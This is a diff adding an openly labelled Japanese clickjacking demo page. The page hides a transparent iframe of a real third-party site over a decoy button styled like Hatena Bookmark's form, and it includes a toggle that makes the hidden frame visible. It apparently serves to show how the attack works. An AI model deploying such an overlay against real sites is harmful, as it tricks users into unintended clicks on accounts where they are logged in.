@@ -1,0 +1,124 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ja" lang="ja">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="Content-Script-Type" content="text/javascript" />
+    <meta http-equiv="Content-Style-Type" content="text/css" />
+    <title>クリックジャッキング デモ</title>
+    <link rel="stylesheet" href="http://b.hatena.ne.jp/css/common.css" type="text/css" media="all" />
+    <link rel="stylesheet" href="http://b.hatena.ne.jp/css/bookmark.css" type="text/css" media="all" />
+
+<style>
+* {
+	visibility: hidden;
+}
+
+#info {
+	visibility: visible;
+	position: absolute;
+	top: 0;
+	left: 0;
+	padding: 0.5em;
+}
+
+#info *,
+iframe#target,
+#click {
+	visibility: visible;
+}
+
+#click {
+	background: #f00;
+}
+
+iframe#target {
+	position: absolute;
+	top: 0;
+	left: 0;
+
+	filter: alpha(opacity=00);
+	-moz-opacity: 0.0;
+	opacity: 0.0;
+	-khtml-opacity:0.0;
+
+	width: 97%;
+	height: 200px;
+
+	overflow: hidden;
+	z-index: 9;
+}
+
+
+#info2 {
+	visibility: visible;
+	position: absolute;
+	bottom: 0;
+	padding: 0.5em;
+}
+
+#info2 * {
+	visibility: visible;
+}
+
+</style>
+
+  </head>
+  <body id="hatena-bookmark-bookmarklet">
+
+<!-- 透明でかぶせるiframe -->
+<iframe id="target" frameborder="0" scrolling="no" src="http://ecnavi.jp/"></iframe>
+<!-- 透明でかぶせるiframe -->
+
+
+
+<!-- ここからボタン位置調整用のダミー (visibility:hidden) -->
+
+    <div id="hatena-body">
+      <form id="bookmarklet-form" method="get" action="/">
+        <table class="bookmarklet" style="clear:both;" summary="">
+          <tbody>
+            <tr>
+              <th><img src="http://b.hatena.ne.jp/images/bookmarklet_comment.gif" alt="コメント" /></th>
+              <td>
+                <div style="position: relative; padding-right: 4.5em;"><input id="comment" type="text" autocomplete="off" name="comment" value="" size="50" /><span id="typecounter" class="char-count"></span></div>
+                <p class="bookmarklet-notice"><span style="font-weight: bold;">[</span>hoge<span style="font-weight: bold;">]</span>...と書くとタグが利用できます</p>
+                <div style="text-align: left; font-size: 90%;">
+<!-- このボタンのみ見えるようにする (visiblity:visible) -->
+                  <input type="button" value="topに戻る" id="click" />
+<!--  -->
+                </div>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </form>
+    </div>
+<!-- ここまでボタン位置調整用のダミー (visibility:hidden) -->
+
+
+
+<p id="info2">
+<input type="button" value="透過してる部分のON/OFF" onclick="openTrap()" />
+
+</p>
+
+  </body>
+
+<script type="text/javascript">
+function openTrap() {
+	var t = document.getElementById('target');
+	var o = 40;
+
+	if (t.style.opacity-0) {
+		t.style.opacity = t.style.MozOpacity = t.style.KhtmlOpacity = 0
+		t.style.filter = 'alpha(opacity=0)';
+	} else {
+		t.style.opacity = t.style.MozOpacity = t.style.KhtmlOpacity = o / 100;
+		t.style.filter = 'alpha(opacity=' + o + ')';
+	}
+}
+</script>
+
+
+</html>
+
